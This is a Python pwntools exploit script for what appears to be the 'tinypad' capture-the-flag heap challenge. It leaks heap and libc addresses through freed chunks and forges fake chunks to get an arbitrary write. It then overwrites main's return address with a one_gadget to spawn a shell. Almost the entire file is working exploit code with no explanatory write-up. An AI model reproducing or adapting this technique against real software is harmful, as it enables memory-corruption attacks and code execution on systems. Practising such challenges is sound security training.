# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
# name = './tinypad-patch'
name = './tinypad'
r = process(name)

libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
def attach_and_debug():
    print(str(r.proc.pid))
    gdb.attach(r, """
    echo  br  *0x0000000000400e67\\n
    heap
    echo x/40gx 0x603000\\n
    x/50gx 0x602040
    """);
    print(str(r.proc.pid))

    r.interactive()

def add(size, data):
    r.recvuntil("(CMD)>>> ")
    r.sendline('a')
    r.recvuntil("(SIZE)>>> ")
    r.sendline(str(size))
    r.recvuntil("(CONTENT)>>> ")
    r.send(data)

def d(index):
    r.recvuntil("(CMD)>>> ")
    r.sendline('d')
    r.recvuntil("(INDEX)>>> ")
    r.sendline(str(index))

def edit(index, data):
    r.recvuntil("(CMD)>>> ")
    r.sendline('e')
    r.recvuntil("(INDEX)>>> ")
    r.sendline(str(index))
    r.recvuntil("(CONTENT)>>> ")
    r.send(data)
    r.recvuntil("(Y/n)>>")
    r.sendline("Y")


add(0x88,'A\n')
add(0xf8,'B\n')
add(0x80,'C\n')
add(0x80,'D'*0x80+'\n')

d(3)
d(1)

# 1. leak
r.recvuntil(" #   INDEX: 1")
r.recvuntil(" # CONTENT: ")
heap_base = u64(r.recvuntil('\n').strip('\x0a').ljust(8, '\0'))-0x120-0x70
print("heap_base: ", hex(heap_base))

r.recvuntil(" #   INDEX: 3")
r.recvuntil(" # CONTENT: ")
libc_base = u64(r.recv(6).ljust(8, '\0')) -  0x3c4b78
print("libc_base: ", hex(libc_base))

# attach_and_debug();pause()

malloc_hook = 0x3c4b10 + libc_base 
environ = 0x3c6f38+libc_base 

# 2. xxx
add(0x80, 'A'*25+'\n') # memo1 (old 3)

payload = ''
payload += p64(0)+p64(0x21)
payload += p64(0x603070)+p64(0x603070) #??
payload += p64(0x20)
payload = payload.rjust(0x88, 'A')
add(0x88, payload+'\n')  # memo3(old 1)

d(2)


payload = ''
payload += p64(0)+p64(0)
payload += p64(0)+p64(0x121)
add(len(payload), payload+'\n') #memo 2

d(3)
d(2)



payload = ''
payload += 'A'*0x60
payload += p64(0)+p64(0x31)
payload += p64(0x602138)+p64(0) #fd 
add(0x80, payload+'\n')

attach_and_debug();pause()
# 
d(1)
add(0x30, 'aaa\n')
add(0x20, 'aaa\n')
d(2)

payload = ''
payload += p64(libc_base+0x3c6f38)
payload+=p64(0xf0)+p64(0x602148) #whatever
# payload+=p64(0xf0)+p64(0x602148) #whatever
add(0x20, payload+'\n')


r.recvuntil(" #   INDEX: 1")
r.recvuntil(" # CONTENT: ")
environ_addr = u64(r.recv(6).ljust(8, '\0')) 
main_ret_addr = environ_addr- 0xf0
one_gadget_addr = libc_base + 0x45216
print("environ_addr: ", hex(environ_addr)) 
print("main_ret_addr: ", hex(main_ret_addr)) 
print("one_gadget_addr: ", hex(one_gadget_addr)) 


edit(2, p64(main_ret_addr)+'\n')
edit(1, p64(one_gadget_addr)+'\n')


attach_and_debug()

